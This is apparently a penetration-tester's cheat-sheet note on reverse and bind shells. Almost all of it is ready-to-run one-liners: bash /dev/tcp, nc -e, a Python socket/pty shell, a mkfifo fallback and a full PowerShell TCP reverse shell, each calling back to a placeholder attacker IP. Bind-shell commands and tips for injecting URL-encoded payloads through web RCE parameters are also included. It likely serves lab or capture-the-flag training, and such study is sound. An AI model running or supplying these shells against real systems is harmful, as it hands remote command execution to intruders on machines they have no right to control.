# 🐚 Reverse & Bind Shells

> The one-liners that call back to your listener (reverse) or open a port on the target (bind). **Start the listener first**, use `LHOST=tun0` and a **common egress port (443/80/53)**, and match the payload to the target OS.

Part of [[Shells]]. Related: [[Shell Upgrade & TTY]] · [[msfvenom Payloads]] · [[Reverse Shell Cheat Sheet]]

---

## 🧠 THINK
- **Listener up before the payload fires.** `LHOST` = your **tun0** IP (`ip a show tun0`).
- Reverse shells beat bind shells (target firewalls usually block inbound).
- If one one-liner fails, try another transport (bash → nc → python → mkfifo).
- URL-encode when injecting via web params.

## 1. LISTENER
```bash
nc -lvnp 443
```
```bash
rlwrap nc -lvnp 443        # arrow keys/history
```

## 2. REVERSE — Linux (set IP/PORT)
```bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
```bash
nc IP PORT -e /bin/bash
```
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```
mkfifo fallback (no `-e`):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```

## 3. REVERSE — Windows (PowerShell one-liner)
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sl=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sl,0,$sl.Length);$s.Flush()}"
```
nc.exe (upload a static build):
```cmd
nc.exe IP PORT -e cmd.exe
```

## 4. BIND SHELL (target opens the port; you connect in)
Target (Linux):
```bash
nc -lvnp 4444 -e /bin/bash
```
You connect:
```bash
nc -nv IP 4444
```
Use when you **can't** receive a callback but can reach an open port on the target.

## 🔁 FOUND → NEXT
| SITUATION | NEXT |
|---|---|
| Got a raw shell | upgrade → [[Shell Upgrade & TTY]] |
| Web RCE param | drop a URL-encoded reverse one-liner |
| Need a binary payload | [[msfvenom Payloads]] |
| Windows, want stability | evil-winrm / [[msfvenom Payloads]] meterpreter |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No callback | wrong LHOST (tun0), blocked port (443/80/53), arch/OS mismatch → [[Reverse Shell Not Connecting]] |
| `nc -e` unsupported | mkfifo / bash `/dev/tcp` / python variant |
| Shell dies instantly | wrong shell type (sh vs bash vs powershell) — try another |
| No python on target | `script -qc /bin/bash /dev/null`, perl, or socat |

## 📇 CHEAT SHEET
```bash
rlwrap nc -lvnp 443
```
```bash
bash -c 'bash -i >& /dev/tcp/YOURIP/443 0>&1'          # Linux reverse
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP 443 >/tmp/f   # fallback
```
**Kill shot:** listener up → reverse one-liner (tun0/443) → catch → [[Shell Upgrade & TTY]].
